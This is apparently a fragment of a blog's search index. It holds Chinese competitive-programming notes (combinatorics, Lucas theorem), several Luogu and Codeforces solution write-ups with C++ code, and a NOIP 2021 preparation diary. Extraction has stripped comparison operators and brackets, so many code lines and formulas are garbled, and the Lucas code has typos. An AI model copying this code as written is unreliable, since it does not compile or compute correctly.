0\\\\f_2 = 1\\\\f_i = (i - 1) \\times (f_{i - 1} + f_{i - 2})\\ (i > 2)对于第 $i$ 项，可以在前 $i - 1$ 个数中选一个数与第 $i$ 个数替换，共 $i - 1$ 中，然后问题变为求 $(i - 1) \\times (f_{i - 2})$。也可以将前 $i - 1$ 个数中的一个数放在前 i - 1 个位置中符合条件的某一个位置，相当于求 $(i - 1) \\times f_{i - 1}$ 这一新的错排。 圆排列原来每组排列都有 $n$ 种排列等价，故方案数为： \\frac{n!}{n}多重集合的排列 集合中有 $k$ 种不同类型的对象，每种数量均为无限，从中选 $n$ 个，排列的方案数为： k^n 集合中有 $k$ 种不同类型的对象，每种数量分别为 $n_1$ 至 $n_k$，从中选 $n$ 个。相当于选出 $n_1$ 个位置放第 $1$ 种，选出 $n_2$ 个位置放第 $2$ 种，以此类推。方案数为： \\tbinom{n}{n_1} \\times \\tbinom{n - n_1}{n_2} \\times \\cdots \\times \\tbinom{n - n_1 - n_2 - \\cdots - n_{k - 1}}{n_k}= \\dfrac{n!}{n_1!n_2!\\cdots n_k!}多重集合的组合集合中有 $k$ 种不同类型的对象，每种数量均为无限，从中选 $n$ 个。等价于 $k$ 个相同的球放到 $n$ 个不同的盒子中，盒子可以为空。或者等价于选 $k$ 次球，每次都可以选 $n$ 种球，且选择不分先后。组合的方案数为： \\tbinom{n + k - 1}{k} = \\tbinom{n + k - 1}{n - 1}康托展开1. 计算排列的排名设 $a_i$ 表示 $i$ 位置右边比它小的数的个数，则该排列之前的排列总数为： x = a_1 (n - 1)! + a_2 (n - 2)! + \\cdots + a_n0!倘若 $i$ 位置上的数比该数小，则在它右边的数可以随意放置，若 $i$ 位置上的数等于该数，则继续判断 $i + 1$ 位置的数的情况，以此类推。因此可以由加法原理得可知该排列之前的排列总数。所以求排名的公式为： ans = 1 + \\sum_{i = 1}^n a_i \\times (n - i)!2. 计算特定排名的排列即康托展开的逆展开。 利用康托展开的公式，类似进制转换的方式去确定从高到底的每一位。若排列长度为 $x$，求编号为 $0$ 开始的，编号为 $k$ 的排列。方法如下：$p = \\frac{k}{(x - 1)!}$，则说明第一位右边有 $p$ 个数比它小，所以最高位为 $p + 1$，然后取余数重复操作，知道确定排列上的所有数字。 3. 求下一个排列对于一个排列：$a_1,a_2,\\cdots,a_n$。从后往前找到第一个 $p_i p_{i + 1}$ 的位置，从后往前找到第一个 $p_j p_i$ 的位置。最后交换 $p_i,p_j$ 并颠倒 $i$ 位置以后的所有元素即可。 斯特林数1. 第一类斯特林数 求将 $n$ 个不同的物体摆成k个非空环的方案数。采用动态规划的做法，对于第 $i$ 个物体，可以任取一个环加入，也可以构造一个新环，故有 $dp_{n,k} = (n - 1)dp_{n - 1,k} + dp_{n - 1,k - 1}$。（当然有初始化 $dp_{0,0} = dp_{1,1} = 1$） 2.第二类斯特林数 求将 $n$ 个不同的物体分成 $k$ 个非空集合的方案数。采用动态规划的做法，对于第 $i$ 个物体，可以任取一个集合加入，也可以放入一个新集合中，故有 $k \\times dp_{n - 1,k} + dp_{n - 1,k - 1}$。（当然有初始化 $dp_{i,i} = dp_{i,1} = 1$） 卡特兰数题目描述，假如有一个 $n\\times n$ 的网络，从左下角 $A$ 点走到右上角 $B$ 点且不穿越对角线的方案数。通过几何方法证明，答案为： \\text{Catalan}(n)= \\tbinom{2n}{n} - \\tbinom{2n}{n + 1}= \\frac{1}{n + 1}\\tbinom{2n}{n}= \\frac{1}{n + 1}\\sum_{i = 0}^{n}\\tbinom{n}{i}^2其它的表达形式还有： C(n + 1) = \\sum_{i = 0}^n C(i)\\times C(n - i),C(0) = 1\\\\C(n + 1) = \\frac{2(2n + 1)}{n + 2} C(n),C(0) = 1常见应用： 合法的括号匹配 $n$ 个节点二叉树的形态数 入栈出栈的排列总数 凸 $n+2$ 边形的分割 放球问题设 $dp_{i,j}$ 表示 $i$ 个小球放到 $j$ 个盒子的方案数。 1. 球相同，盒相同，可为空。则有：$dp_{i,j} = dp_{i,j - 1} + dp_{i - 1,j}$。 2. 球相同，盒相同，不可为空。则有：$dp_{i,j} = dp_{i - j,j}$。 3. 球不同，盒不同，可为空。则有：$j^i$。 4. 球不同，盒相同，不可为空。则有：$dp_{i,j} = dp_{i - 1,j} + dp_{i - 1,j - 1}$。 5. 球不同，盒不同，不可为空。则有：$dp_{i,j} \\times {j!}$。 6. 球不同，盒相同，可为空。枚举盒子数，则有：$dp_{i,j} = dp_{i - 1,j} + dp_{i - 1,j - 1}$。 7. 球相同，盒不同，不可为空。隔板法，则有：$\\tbinom{i - 1}{j - 1}$。 8. 球相同，盒不同，可为空。则有：$\\tbinom{i + j - 1}{j - 1}$。 卢卡斯定理n = (a_0a_1\\cdots a_k)_p\\\\m = (b_0b_1\\cdots b_k)_p\\\\\\tbinom{n}{m} \\equiv \\Pi_{i = 0}^{k} \\tbinom{a_i}{b_i} \\pmod p\\\\\\tbinom{n}{m} = \\tbinom{n \\bmod p}{m \\bmod p} \\times \\tbinom{\\lfloor\\frac{n}{p}\\rfloor}{\\lfloor\\frac{m}{p}\\rfloor} \\bmod p证明略。代码如下： int calc (int n,int m) if (n m) return 0; return 1ll * fac[n] * inv(fac[m]) % MOD * inc (fac[n - m]) % MOD;int lucas (int m,int m) if (!m) return 1; return 1ll * lucas (n / MOD,m / MOD) * clac (n % MOD,m % MOD) % MOD;","categories":["Algorithm"]},{"title":"题解：P2875 [USACO07FEB]The Cow Lexicon S","path":"/2021/11/08/P2875/","content":"这道题和 $\\texttt{P2432}$ 的题目是一样的。考虑动态规划的作法，设 $dp[i]$ 表示原字符串的前 $i$ 位最少需要删除的字符的数量，显然最后的答案是 $dp[L]$。 对于初始值，因为求最小值，所以先把 $dp[i]$ 均设置为 $+\\infty$，同时由转移方程的含义可知 $dp[0] = 0$。然后就是处理单词与文章是否能匹配的核心思路了，设 $dx$ 表示当前匹配到的位置 $i$，$dy$ 表示第 $j$ 个单词的长度 $len[j]$。从 $i$ 与单词的末尾开始，若成功匹配，则 $dx,dy$ 均减一，否则 $dx$ 减一。如果 $dy$ 的值先变为 $0$ 或者 $dx,dy$ 同时变为 $0$，这说明该单词能够在原字符串中匹配；但是如果不能匹配，显然原字符串的第 $i$ 个位置需要被删除。 所以有状态转移方程 $dp[i] = \\min (dp[i - 1] + 1,dp[dx] + (i - dx - len[j])$，显然此时的 $dx$ 表示在匹配之后 $dx$ 的值，而不是初始的 $dx = i$。 讲了这么多，再看着代码理解一下叭！ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 605;const int MOD = 1e9 + 7;inline int read ();int n,m,dlen[MAX],dp[MAX];char str[MAX 1],cor[MAX][30]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) scanf (%s,cor[i] + 1); dlen[i] = strlen (cor[i] + 1);//单词的长度 init (dp);//初始化 dp[0] = 0; for (int i = 1;i = m;++i) dp[i] = dp[i - 1] + 1; for (int j = 1;j = n;++j)//共有 n 个单词，一一匹配 int dx = i,dy = dlen[j]; while (dx dy)//边界条件 if (str[dx] == cor[j][dy]) --dx,--dy; else --dx; if (!dy) dp[i] = min (dp[i],dp[dx] + (i - dx - dlen[j]));//成功匹配才能进行状态转移 printf (%d ,dp[m]);//此处为 m 而不是 n 哦！ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2021 NOIP 备赛记","path":"/2021/11/06/NOIP2021/","content":"坐标 $\\texttt{ZJ}$ $\\texttt{Day -16 2021.11.04}$本以为今年没机会了（退役准备，没想到通过今年上半年打的 $\\texttt{NOI Online}$ 前 $25\\%$ 报名成功了。 $\\texttt{Day -14 2021.11.06}$机房打了套训练赛，分数一般般，因为不是正式比赛，写题时间本来就不多，外加 $\\texttt{T2}$ 绕了很久，所以后两题基本骗分，最后 $100 + 100 + 10 + 30 = 240$ 滚粗。 $\\texttt{T1}$ 第一眼看以为是 $\\texttt{dp}$，稍微想了一下，再瞅了眼数据范围，发现就是道弱智模拟，然后果断用栈切了。（小插曲就是栈不判空，然后一直运行错误……） $\\texttt{T2}$ 一开始没什么思路，直接打了个爆搜外加 $n = 4$ 的特判大概 $40pts$。然后就一直在思考，感觉有规律可循但是又码不出来。想了大概半小时然后和身边大佬交流了一下，发现可以从结果倒退，于是就开始疯狂递归。接下去就是关于字典序的问题，模拟了一下发现因为存在对称性，所以可以边递归边暴力交换。差不多又是半小时码完了，以为自己打了个可能超时的算法，后来才发现又是时间复杂度算错了（$\\texttt{CSP}$ 惨痛教训），重新计算发现是 $O(2^n \\times n)$，那应该就是正解了。 $\\texttt{T3}$ 先吐槽一下 $\\texttt{SPJ}$ 因为一定要和标准答案一样输出九位小数时才能得分，所以差评差评差评！赛时没啥思路，所以就骗了最简单的一个情况拿了 $10pts$，后来发现有个地方写错了，本来还能再拿（骗） $10pts$ 的。 $\\texttt{T4}$ 直接输出了 IMPOSSIBLE，没想到竟然拿了 $30pts$（有 CCF 那味儿了）。 $\\texttt{Day -13 2021.11.07}$补昨天的那套模拟赛。 发现 $\\texttt{T3}$ 就是一个 $\\texttt{dp}$。有一个前置结论就是将 $p[i]$ 从小到大排序后肯定是去选择一段前缀和一段后缀。设 $f[i][j]/h[i][j]$ 表示选择前/后 $i$ 个同学,有 $j$ 个同学投“好”的概率。对于第 $i$ 位，分类讨论是否投“好”，于是就有转移方程（$h[i][j]$ 的同理可知）： \\begin{cases} f[i][j]=f[i - 1][j] \\times (1 - p[i])\\ (j = 0)\\\\ f[i][j]=f[i - 1][j] \\times (1 - p[i]) + f[i - 1][j - 1] \\times p[i]\\ (j > 0) \\end{cases}当然，初始的条件肯定是 $f[0][0] = h[0][0] = 1$，就是说前 $0$ 位同学肯定没有人会投“好”。最后求答案的时候，因为要平票，也就是说选 $\\frac{k}{2}$ 位同学投“好”。再选定 $k$ 个人的时候，前面选 $i$ 位，后面选 $k - i$ 位，然而投“好”的人不确定，所以要通过循环累加答案，最后取最小值。时间复杂度为 $O(n^2)$。 $\\texttt{Day -12 2021.11.08}$继续补模拟赛，但发现还是不会qwq，颓了……复习知识点去了！被初赛的最后一题恶心到了，因此学习一下笛卡尔树。 笛卡尔树是一种二叉树，每一个结点由一个键值二元组 $(k,w)$ 构成。要求 $k$ 满足二叉搜索树的性质，而 $w$ 满足堆的性质。笛卡尔树的中序遍历便是原序列。 保证 $k_i$ 递增，从下往上比较右链结点与当前结点 $u$ 的 $w$，如果找到了一个右链上的结点 $x$ 满足 $x_w u_w$，就把 $u$ 接到 $x$ 的右儿子上，而 原本 $x$ 的右子树就变成 $u$ 的左子树。每个数最多进出右链一次，可以用单调栈维护，时间复杂度为 $O(n)$。下面放个核心代码： //k 记录当前的栈顶；top 记录上一次的栈顶for (int i = 1;i = n;++i) k = top; while (k root[i] root[s[k]]) --k; if (k) rc[s[k]] = i; if (k top) lc[i] = s[k + 1]; s[++k] = i; top = k; $\\texttt{Day -11 2021.11.09}$分治算法专题 逆序对 用归并排序模拟过程。假设将有序数组 $A,B$ 合成 $C$，元素个数分别为 $sz_a,sz_b$，指针为 $p_a,p_b$。则当 $A[p_a] B[p_b]$ 时，$A$ 中 $p_a$ 之后的所有元素与 $B[p_b]$ 形成逆序对，所以答案累加 $sz_b - p_a + 1$。 由于使用归并排序分治求解，所以时间复杂度为 $O(n \\log n)$。当然用树状数组的时间复杂度也是一样的。核心代码放一个吧！ while (p1 = mid || p2 = r) if (p1 = mid (p2 r || a[p1] = a[p2])) b[++p] = a[p1]; ++p1; else b[++p] = a[p2]; ++p2; ans += mid - p1 + 1; ST 表 用 $f_{i,j}$ 表示以 $i$ 为起点，区间长度为 $2^j$ 的最值。显然初始化为 $f_{i,0} = a_i$，转移方程为（以最小值为例）：$f_{i,j} = \\min (f_{i,j - 1},f_{i + 2^{j - 1} + 1,j - 1})$。 在查询区间时，设区间长度为 $k$，则需要找出最大的 $p$ 满足 $2^p \\le k$，也就是 $\\min (f_{l,p},f_{r - (1 k) + 1,p})$。时间复杂度依旧是 $O(n \\log n)$。 平面最近点对 最简单的做法是暴力枚举，时间复杂度为 $O(n^2)$。但是有更优解法，现在考虑分治。 首先将所有点按照 $x$ 坐标排序，并分成左右两侧。利用递归求解左右两侧的最优答案，设为 $(p_1,p_2)$ 和 $(q_1,q_2)$。在合并答案的时候，可能答案在已经被计算完成的同侧，也可能是两侧。 设 $d = \\min (dis(p_1,p_2),dis(q_1,q_2))$，显然最优解分布于中轴线两侧时，距离小于 $d$。固定一侧的一个点 $p$，则只需再框出另一侧的 $d \\times 2d$ 的区域的点进行答案的更新即可（由数学中的鹊巢原理知最多有 $6$ 个点在该区域中）。 因此，我们将点再按照 $y$ 坐标排序，由于所框的区域单调递增，所以复杂度为 $O(n)$，总复杂度为 $O(n \\log ^2 n)$。当然，其中的排序可以用归并排序来代替，在进行合并时，同时进行按照 $y$ 坐标的排序，这样原来用 sort 排序的时间复杂度就被省去，总复杂度降为 $O(n \\log n)$。 放个主要代码： double search (int l,int r) if (l == r) return INF; int mid = (l + r) 1; double md = p[mid].x,d = min (search (l,mid),search (mid + 1,r));//递归求解左右两侧的最优解 int p1 = l,p2 = mid + 1,cnt = 0; while (p1 = mid || p2 = r)//按照 y 轴进行归并排序 if (p1 = mid (p2 r || p[p1].y p[p2].y)) q[++cnt] = p[p1++]; else q[++cnt] = p[p2++]; for (int i = 1;i = cnt;++i) p[l + i - 1] = q[i]; cnt = 0; for (int i = l;i = r;++i) if (abs(p[i].x - md) = d) q[++cnt] = p[i];//横坐标在 d 范围内 for (int i = 1;i = cnt;++i) for (int j = i - 1;j = 1 q[i].y - q[j].y = d;--j) d = min (d,dis (q[i],q[j]));//纵坐标在 d 范围内 for (int j = i + 1;j = cnt q[j].y - q[i].y = d;++j) d = min (d,dis (q[i],q[j])); return d; 【咳咳，话说我竟然被加强加强版的精度卡了好久，没想到最后改成 printf (%0.0lf ,ans * ans); 就过了，哭…】 $\\texttt{cdq}$ 分治 这一类问题的特点在于分治划分出来的两个子问题前后具有一定的影响。 由二维偏序引入，$n$ 个有序对 $(a_i,b_i)$，求对于每一个 $(a_i,b_i)$，满足 $a_i a_j$ 且 $b_i b_j$ 的有序对 $(a_j,b_j)$ 的个数。该问题的解法就相当于归并排序求顺序对。在排序过程中，可以令 $a_i$ 代表在数组中的位置，$b_i$ 代表值，因此将 $a_i$ 排序之后就能忽略其影响。时间复杂度为 $O(n \\log n)$。 而对于三维偏序问题，给定 $n$ 个有序对 $(a,b,c)$，求对于每个 $(a,b c)$，满足 $a_1a,b_1b,c_1c$ 的有序对 $(a_1,b_1,c_1)$ 有多少个。考虑将 $a$ 排序，然后 $b$ 用归并排序，因此现在只需再考虑 $c$ 的大小。 欲求 $[l,p_1)$ 上 $c_i c_{p_2}$ 的个数，可以用数据结构（如树状数组）维护 $c$ 的值。当选择 $p_1$ 时，加入 $c_{p_1}$ 的值，当选择 $p_2$ 时，直接查询数据结构中小于 $c_{p_2}$ 的数量。注意合并后数据结构的清空，需要倒序删除（若使用树状数组，则需要将 $[l,mid]$ 的所有 $c_i$ 均 $-1$），否则维护的时间复杂度会退化为 $O(n)$。因为使用了时间复杂度为 $O(\\log n)$ 的数据结构，再加上之前二维偏序的时间复杂度，因此总时间复杂度变为 $O(n \\log^2 n)$。 于是敲了道模板题【模板】三维偏序（陌上花开），放个核心代码： int main () n = read ();k = read (); for (int i = 1;i = n;++i) p[i].x = read (),p[i].y = read (),p[i].z = read (); sort (p + 1,p + 1 + n,cmp); for (int i = 1;i = n;++i)//去重 if (p[i].x != p[cnt].x || p[i].y != p[cnt].y || p[i].z != p[cnt].z) p[++cnt] = p[i]; ++tot[cnt]; for (int i = 1;i = cnt;++i) p[i].id = i; work (1,cnt); for (int i = 1;i = cnt;++i) ans[num[i] + tot[i] - 1] += tot[i]; for (int i = 0;i n;++i) printf (%d ,ans[i]); return 0;void work (int l,int r) if (l == r) return ; int mid = (l + r) 1,p1 = l,p2 = mid + 1,t = 0; work (l,mid);work (mid + 1,r); while (p1 = mid || p2 = r) if (p1 = mid (p2 r || p[p1].y = p[p2].y)) q[++t] = p[p1]; modify (p[p1].z,tot[p[p1].id]);++p1; else q[++t] = p[p2]; num[p[p2].id] += query (p[p2].z);++p2; for (int i = l;i = mid;++i) modify (p[i].z,-tot[p[i].id]); for (int i = 1;i = t;++i) p[l + i - 1] = q[i]; $\\texttt{Day -7 2021.11.13}$前几天一直在学习分治，今天又是周末，所以又是模拟赛。今天的题目感觉比上次还难，其中 $\\texttt{T2}$ 数据似乎锅了，所以目前的成绩是：$100 + ? + 0 + 0$。拿到题解发现那题和题解的思路一样，估计数据改了能过，大概 $200$ 分的样子。 $\\texttt{T1}$ $5$ 分钟敲完 $O(n^2)$ 暴力，发现竟然可以拿到 $60pts$，尝试去优化算法，但是想了好久都无法降低复杂度。这时候去看了一眼数据范围，发现 $a_i,b_i$ 都为非负整数且 $\\sum a_i,\\sum b_i \\le 5000$，而 $n$ 又巨大，显然数据中最多出现 $5000$ 个非零数。那么只要将非零数单独挑出来，注意记录原下标，这下循环暴力也能解决了。时间复杂度 $O(n + 5000^2)$。 $\\texttt{T2}$ 一看数据范围就猜测是 $O(n)$ 的贪心，题目很水，类似求最大连续和的处理，遇到 B 就 ++cnt，遇到 A 就 cnt = max (cnt - 1,0)，当然，若出现需要将 A 该为 B 时，就相当于 cnt = max (cnt - 2,0)。由于要求最值，所以尽量修改靠左侧的。如果从 $1$ 开始循环会出错，稍作改变倒序循环就能完美解决。对于 $2^i$ 的处理，一开始用了快速幂，后来发现只需要 $O(n)$ 的预处理就行了。因此总复杂度仍然是 $O(n)$ 的，个人感觉这道题比 $\\texttt{T1}$ 简单好多，毕竟是一眼题。 $\\texttt{T3}$ 只会打 $O(nq)$ 的大暴力，虽然时限 $3s$，但还是全部超时了。$\\texttt{T4}$ 完全不会。 赛后看了题解，后两题还是不太会，可能只能先放着了 qwq。 $\\texttt{Day -5 2021.11.15}$ 打了考前最后一次的模拟赛，然而一开始就想复杂。明明可以有很好些的 $O(n)$ 优先队列，硬是被打成了 $4KB+$ 的 $O(n \\log n)$ 的线段树，还没过大样例，于是乎果断走人…… 选择打模拟赛真是个错误。 $\\texttt{Day -3 2021.11.17}$ 再复习点什么吧…… 矩阵乘法 $C_{i,j} = \\sum_{k = 1}^{M} A_{i,k} \\times B_{k,j}$ 构造单位矩阵是优化中最重要的部分，以斐波那契数列为例，由于 $f_i = f_{i - 1} + f_{i - 2},f_{i - 1} = f_{i - 1}$，所以单位矩阵为 $\\left[ \\begin{array}{ccc} 11\\ 01\\ \\end{array} \\right]$。一开始的前两项为$1,1$，所以 $f_{n \\mid n 3} = \\left[1 1\\right] \\times \\left[ \\begin{array}{ccc} 11\\ 01\\ \\end{array} \\right]^{n - 2}$。还有一个单位矩阵 $I$ 满足 $A \\times I = I \\times A = A$，则 $I = \\left[ \\begin{array}{ccc} 10\\ 01\\ \\end{array} \\right]$。 做了道P1707 刷题比赛，然后 $11 \\times 11$ 矩阵调了一万年。一开始过不了样例，最后发现矩阵少打了一个 $1$，然后又因为取模 $\\texttt{WA}$ 了好几发，最后改成龟速乘才过。 单调队列 每个元素最多进队一次，出队一次，因此时间复杂度为 $O(n)$。 还是做了一题P2254 [NOI2005] 瑰丽华尔兹。设 $dp_{i,j}$ 表示滑行到 $(i,j)$ 时的最长距离。而在滑行中因每次只向一个方向滑动，因此可以记录开始移动时与当前的相对位置，并用单调队列维护最大值。当然，滑动需要不碰到家具，则在碰到时清空单调队列即可。这样时间复杂度就降到了 $O(kmn)$。 $\\texttt{Day -2 2021.11.18}$复习数学，看了之前的学习笔记。 敲了一下线性筛，$\\texttt{exgcd}$，乘法逆元和欧拉函数的模板。 $\\texttt{Day -1 2021.11.19}$先复习了图论的部分内容，敲了个求割点以及最近公共祖先的模板。然后看了一些 $\\texttt{STL}$ 关键字的拼写及 set 的用法。 大概 $19:30$ 离开了机房。 祝愿 $\\texttt{rp++}$吧！ $\\texttt{Day 0 2021.11.20}$$7:00$ 起床前往杭师大仓前校区。 $8:00$ 就到了，进去静坐了将近半小时。 开赛后快速看了题，然后感觉 $\\texttt{T1}$ 比较好写，和线性筛差不多。写了一遍发现似乎有点问题，筛不出 $14$。然后尝试了一下埃筛，本以为会超时，但是跑了一下大样例发现只要不到 $0.5s$，检查了一下，发现了一个边界的小错误，其它无误后就看了下一题。 至此开始，整个人一直静不下心来，这也就是本场比赛导致失败的重要原因。 $\\texttt{T2}$ 看了很久都毫无思路，连 $\\texttt{dp}$ 都没有看出来。最后连注释都没删有说明了在考场时的浮躁。 $\\texttt{T3}$ 写了一个暴力，但是我在修改多次后竟没发现开了 1e8 的数组，于是乎又没了。 $\\texttt{T4}$ 没调完，但是依旧犯了一个致命的错误，就是起点忘记加入到队列当中。 最后洛谷自测 $100 + 0 + 0 + 0 = 100 \\texttt{ pts}$，没想到连暴力都挂，心情不佳，怕会影响到 whk，就暂时退役了…… 后记$\\texttt{2021 NOIP}$ 结束了，接下去又是一年的漫长训练。一定要吸取教训，多多练习 $\\texttt{dp}$，以减少考试时候的紧张感。加油吧！","categories":["Journal"]},{"title":"题解：P2432 zxbsmk爱查错","path":"/2021/10/31/P2432/","content":"考虑动态规划的作法，设 $dp[i]$ 表示原字符串的前 $i$ 位最少需要删除的字符的数量，显然最后的答案是 $dp[L]$。 对于初始值，因为求最小值，所以先把 $dp[i]$ 均设置为 $+\\infty$，同时由转移方程的含义可知 $dp[0] = 0$。然后就是处理单词与文章是否能匹配的核心思路了，设 $dx$ 表示当前匹配到的位置 $i$，$dy$ 表示第 $j$ 个单词的长度 $len[j]$。从 $i$ 与单词的末尾开始，若成功匹配，则 $dx,dy$ 均减一，否则 $dx$ 减一。如果 $dy$ 的值先变为 $0$ 或者 $dx,dy$ 同时变为 $0$，这说明该单词能够在原字符串中匹配；但是如果不能匹配，显然原字符串的第 $i$ 个位置需要被删除。 所以有状态转移方程 $dp[i] = \\min (dp[i - 1] + 1,dp[dx] + (i - dx - len[j])$，显然此时的 $dx$ 表示在匹配之后 $dx$ 的值，而不是初始的 $dx = i$。 讲了这么多，再看着代码理解一下叭！ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 605;const int MOD = 1e9 + 7;inline int read ();int n,m,dlen[MAX],dp[MAX];char str[MAX 1],cor[MAX][30]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) scanf (%s,cor[i] + 1); dlen[i] = strlen (cor[i] + 1);//单词的长度 init (dp);//初始化 dp[0] = 0; for (int i = 1;i = m;++i) dp[i] = dp[i - 1] + 1; for (int j = 1;j = n;++j)//共有 n 个单词，一一匹配 int dx = i,dy = dlen[j]; while (dx dy)//边界条件 if (str[dx] == cor[j][dy]) --dx,--dy; else --dx; if (!dy) dp[i] = min (dp[i],dp[dx] + (i - dx - dlen[j]));//成功匹配才能进行状态转移 printf (%d ,dp[m]);//此处为 m 而不是 n 哦！ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7886 「MCOI-06」Gerrymandering","path":"/2021/10/05/P7886/","content":"由题意可知，假设对于一个 $n \\times m$ 的表格，我们用了 $p$ 种颜色去染色，显然有 $n \\times m = p \\times k$。移项可知，$p = n \\times m \\div k$。又因为 $p$ 是整数，所以需要满足 $(n \\times m) \\bmod k = 0$ 时才有解。 那么对于一张存在解的表格，可以考虑蛇形方阵式的染色。从左上角开始染色，然后向右直到染色至边界，然后向下，再向左至边界……以此类推，直到染完为止。为了放置爆空间，本题解选择逐行输出答案（当然也可以使用 vector）。 最后核心代码如下： while (no = num) ++cnt; if (ty == 1)//从左往右 if (dx = m) ans[dx] = no,++dx; else//整一行已经染色完毕 for (int i = 1;i = m;++i) printf (%d ,ans[i]),ans[i] = 0; puts (); ty = 2;dx = m; ans[dx] = no;--dx; else if (ty == 2)//从右往左 if (dx = 1) ans[dx] = no,--dx; else for (int i = 1;i = m;++i) printf (%d ,ans[i]),ans[i] = 0; puts (); ty = 1;dx = 1;ans[dx] = no;++dx; if (cnt % k == 0) ++no;//一种颜色的连通块大小为 kfor (int i = 1;i = m;++i) printf (%d ,ans[i]);//最后一行puts ();","categories":["Solution"]},{"title":"题解：CF778A String Game","path":"/2021/09/11/CF778A/","content":"删除字母的个数显然越多越好，再看题目中的 Note that after removing one letter, the indices of other letters dont change. 这句话，意思是删除一个字母后，其他字母的索引不会更改。因此可以二分可以删除的字母的个数，最后输出最大值。 首先确定二分的范围，由数据范围可知，$p$ 串最少删除的字母数量为 $0$。又因为再删除若干个字母后的长度一定不比 $t$ 串的长度小，那么设两个串的长度分别为 $lenp,lent$，则最多删除的字母数量为 $lenp - lent$。 其次再来思考删除字母后判断 $p$ 串中是否仍存在 $t$ 串的方式。先计算出被删除若干个字母的新 $p$ 串，然后利用两个指针 $dx,dy$，分别表示新 $p$ 串与 $t$ 串的匹配状态。通过 while 循环，逐一判断，显然能成功匹配的条件是 $dy = lent$，即表示 $t$ 串中的所有字母都在新 $p$ 串中按顺序出现。 通过二分答案，大大地减少了搜索的次数，时间复杂度也变为 $O(n \\log n)$，$n$ 表示 $p$ 串的长度。完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int lena,lenb,cnt,num[MAX];char a[MAX],b[MAX],str[MAX];bool del[MAX];bool check (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s%s,a,b); lena = strlen (a);lenb = strlen (b); for (int i = 1;i = lena;++i) num[i] = read (); int l = 0,r = lena - lenb;//确定范围 while (l = r)//二分答案 int mid = (l + r) 1; if (check (mid)) l = mid + 1; else r = mid - 1; printf (%d ,l - 1); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool check (int x) for (int i = 1;i = lena;++i) del[i] = 0;//初始化 for (int i = 1;i = x;++i) del[num[i]] = 1;//删除的字母的下标标记为 1 cnt = 0; for (int i = 0;i lena;++i) if (!del[i + 1]) str[++cnt] = a[i];//构成新字符串 p int dx = 1,dy = 0; while (dx = cnt dy lenb)//循环逐一比较 if (str[dx] == b[dy]) ++dx,++dy; else ++dx; if (dy != lenb) return 0;//没有完全匹配 else return 1;//能完全匹配","categories":["Solution"]},{"title":"题解：CF822B Crossword solving","path":"/2021/08/30/CF822B/","content":"对于输入的两个字符串 $s,t$，要修改 $s$ 中尽可能少的字符，使其能在字符串 $t$ 中被查找到。 直接想到最朴素的枚举算法，枚举字符串 $t$ 的左端点，因字符串 $s$ 的长度不变，所以右端点也能够同时被确定。然后每次判断当字符串 $s$ 修改为字符串 $t$ 中等长的某一段时，需要修改的字符数量，也就是两者不相同的字符的数量。当答案有更新的时候，同时记录下需要修改的每一个位置。 核心代码如下： for (int i = 1;i = m - n + 1;++i)//枚举左端点，注意范围 int tot = 0;//计数器的初始化 for (int j = 1,k = i;j = n;++j,++k) if (a[j] != b[k]) ++tot;//两者不同的数量 if (tot ans)//出现更优的答案 cnt = 0;ans = tot;//更新答案 for (int j = 1,k = i;j = n;++j,++k)//依次记录每一个位置 if (a[j] != b[k]) num[++cnt] = j;","categories":["Solution"]},{"title":"题解：P7321 「PMOI-4」猜排列","path":"/2021/08/23/P7321/","content":"$\\texttt{Subtask # 1}$ 我们直接手动模拟。首先肯定要进行一次 ? l S p 操作求得 $4$ 的位置。然后发现 $1$ 至 $3$ 中只有 $3$ 除 $4$ 无法整除，这样我们就可以通过 ! x y 操作求得 $3$ 的位置。同理求出 $2$ 的位置，则最后剩下的一个位置就是 $1$ 了。 $\\texttt{Subtask # 2-3}$ $m_2$ 很大，所以我们可以只用 ? l S p 操作每次求出 $[1,n]$ 间的最大值，然后不断缩小区间直至 $[1,1]$。 $\\texttt{Subtask # 4-6}$ 看到 $m_2$ 的值在 $20$ 以内，便能猜想复杂度与 $2$ 的幂次有关。计算了一下 $2^{15}$ 与 $5 \\times 10^4$ 大致接近，故再次联想到二分。于是乎，就有了二分答案的做法。 对于 ! x y 操作，因为一定要保证询问合法，所以一定是建立在排列上的某位已经确定的情况下。那么肯定需要先从 ? l S p 操作中获取一个数以开始询问。我们想要求出 $[1,n]$ 内的排列，可以先用 ? l S p 操作获取 $n$ 的位置，然后可以根据 $n \\bmod (\\frac{n}{2},n)$ ，其中余数互部不重复的性质用 ! x y 操作求解出 $(\\frac{n}{2},n)$ 内所有数的位置。然后继续减半重复操作直到 $n = 1$ 后把最后一个剩下的位置标记为 $1$ 即可。需要注意的是由于 $m_3$ 的限制，所以 ? l S p 操作时的 $l$ 的大小应该为还未被确定的数的个数，而不是草率的赋值为排列的大小。 $\\texttt{Subtask # 7}$ 但是由于一开始的 ? l S p 